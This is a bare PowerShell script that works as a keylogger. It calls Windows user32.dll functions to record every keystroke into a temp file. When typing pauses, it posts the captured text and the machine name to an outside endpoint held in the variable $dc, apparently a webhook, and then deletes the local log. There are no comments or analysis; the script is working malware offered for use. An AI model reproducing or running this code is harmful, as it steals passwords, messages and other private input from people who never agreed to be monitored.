$API = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
public static extern short GetAsyncKeyState(int virtualKeyCode); 
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@

$logPath = "$env:temp/t.txt"
$API = Add-Type -MemberDefinition $API -Name 'Win32' -Namespace API -PassThru
$no = New-Item -Path $logPath -ItemType File -Force
$fileContent = Get-Content -Path $logPath -Raw
$LastKeypressTime = [System.Diagnostics.Stopwatch]::StartNew()
$KeypressThreshold = [TimeSpan]::FromSeconds(10)
While ($true){
$keyPressed = $false
try{
while ($LastKeypressTime.Elapsed -lt $KeypressThreshold) {
Start-Sleep -Milliseconds 30
for ($asc = 8; $asc -le 254; $asc++){
$keyst = $API::GetAsyncKeyState($asc)
if ($keyst -eq -32767) {
$keyPressed = $true
$LastKeypressTime.Restart()
$null = [console]::CapsLock
$vtkey = $API::MapVirtualKey($asc, 3)
$kbst = New-Object Byte[] 256
$checkkbst = $API::GetKeyboardState($kbst)
$logchar = New-Object -TypeName System.Text.StringBuilder          
  if ($API::ToUnicode($asc, $vtkey, $kbst, $logchar, $logchar.Capacity, 0)) {
    $LString = $logchar.ToString()
      if ($asc -eq 8) {$LString = "[BKSP]"}
      if ($asc -eq 13) {$LString = "[ENT]"}
      if ($asc -eq 27) {$LString = "[ESC]"}
  [System.IO.File]::AppendAllText($logPath, $LString, [System.Text.Encoding]::Unicode) 
}}}}}
finally{
If ($keyPressed) {
$fileContent = Get-Content -Path $logPath -Raw
$escmsgsys = $fileContent -replace '[&<>]', {$args[0].Value.Replace('&', '&amp;').Replace('<', '&lt;').Replace('>', '&gt;')}
$timestamp = Get-Date -Format "dd-MM-yyyy HH:mm:ss"
$escmsg = $timestamp+" : "+'`'+$escmsgsys+'`'
$jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = $escmsg} | ConvertTo-Json
Invoke-RestMethod -Uri $dc -Method Post -ContentType "application/json" -Body $jsonsys 
Remove-Item -Path $logPath -Force
$keyPressed = $false
}}
$LastKeypressTime.Restart()
Start-Sleep -Milliseconds 10
}
